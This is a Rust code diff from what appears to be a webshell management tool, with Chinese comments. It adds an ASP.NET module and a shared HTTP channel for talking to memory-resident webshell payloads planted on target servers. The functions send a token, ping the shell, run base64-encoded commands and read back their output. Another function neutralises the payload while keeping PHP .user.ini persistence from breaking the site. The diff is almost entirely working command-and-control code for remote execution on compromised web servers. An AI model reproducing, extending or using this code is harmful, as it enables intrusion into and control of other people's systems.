@@ -11,6 +11,7 @@
 //! Java 内存马需要先给 JSP 协议补 `run_code` 通道（当前 stub 是固定分发），
 //! 且存在 classloader 回收陷阱，另行排期。
 
+pub mod aspx;
 pub mod fcgi;
 pub mod java;
 mod java_payload;
@@ -25,8 +26,98 @@ pub const TOKEN_HEADER: &str = "X-DSW-TOKEN";
 /// 命令头：base64 后的命令（仅 exec）。
 pub const CMD_HEADER: &str = "X-DSW-CMD";
 
+pub use aspx::KIND_ASPNET_GLOBAL;
 pub const KIND_PHP_USER_INI: &str = "php_user_ini";
 pub const KIND_PHP_FCGI: &str = "php_fcgi";
+
+// ---------------------------------------------------------------------------
+// 内存马载荷的通用 HTTP 通道
+//
+// 载荷契约（PHP / Java / ASP.NET 一致）：
+//   带 `X-DSW-OP` 与 `X-DSW-TOKEN` 请求头，响应体为 `DSW_MEM:...`：
+//   ping → `DSW_MEM:<name>:OK`；exec → `DSW_MEM:<base64(输出)>`；
+//   uninstall → `DSW_MEM:NEUTERED`。
+// 因此传输层与形态无关，统一放在这里。
+// ---------------------------------------------------------------------------
+
+use base64::Engine as _;
+use dosword_sdk::domain::AppSettings;
+
+pub fn http_op(
+    settings: &AppSettings,
+    url: &str,
+    token: &str,
+    op: &str,
+    cmd: Option<&str>,
+) -> Result<String, String> {
+    let client = crate::protocol::transport::build_client(settings);
+    let mut request = client
+        .post(url)
+        .header(OP_HEADER, op)
+        .header(TOKEN_HEADER, token);
+    if let Some(cmd) = cmd {
+        let encoded = base64::engine::general_purpose::STANDARD.encode(cmd.as_bytes());
+        request = request.header(CMD_HEADER, encoded);
+    }
+    let response = request
+        .send()
+        .map_err(|error| format!("请求失败：{error}"))?;
+    let status = response.status();
+    let body = response
+        .text()
+        .map_err(|error| format!("读取响应失败：{error}"))?;
+    if !status.is_success() {
+        return Err(format!(
+            "HTTP {status}：{}",
+            body.chars().take(200).collect::<String>()
+        ));
+    }
+    Ok(body)
+}
+
+pub fn check(settings: &AppSettings, url: &str, token: &str, name: &str) -> bool {
+    http_op(settings, url, token, "ping", None)
+        .map(|body| body.contains(&format!("DSW_MEM:{name}:OK")))
+        .unwrap_or(false)
+}
+
+pub fn exec(
+    settings: &AppSettings,
+    url: &str,
+    token: &str,
+    command: &str,
+) -> Result<String, String> {
+    let body = http_op(settings, url, token, "exec", Some(command))?;
+    body.strip_prefix("DSW_MEM:")
+        .and_then(|rest| {
+            base64::engine::general_purpose::STANDARD
+                .decode(rest.trim())
+                .ok()
+        })
+        .map(|bytes| String::from_utf8_lossy(&bytes).into_owned())
+        .ok_or_else(|| {
+            format!(
+                "响应格式异常：{}",
+                body.chars().take(200).collect::<String>()
+            )
+        })
+}
+
+/// 中和载荷：改写为无害占位 + 从 `.user.ini` 摘除本载荷的 prepend 行。
+///
+/// **不会删除载荷文件** —— 目标 PHP 会缓存 `.user.ini` 内容 `user_ini.cache_ttl` 秒，
+/// 直接删文件会让站点在该窗口内每个请求 500（已实测）。删除应在 TTL 之后进行。
+pub fn uninstall_via_payload(settings: &AppSettings, url: &str, token: &str) -> Result<(), String> {
+    let body = http_op(settings, url, token, "uninstall", None)?;
+    if body.contains("DSW_MEM:NEUTERED") {
+        Ok(())
+    } else {
+        Err(format!(
+            "中和响应异常：{}",
+            body.chars().take(200).collect::<String>()
+        ))
+    }
+}
 
 /// 判定 `php_user_ini` 在当前目标上是否可行。纯本地计算，不发网络请求。
 ///
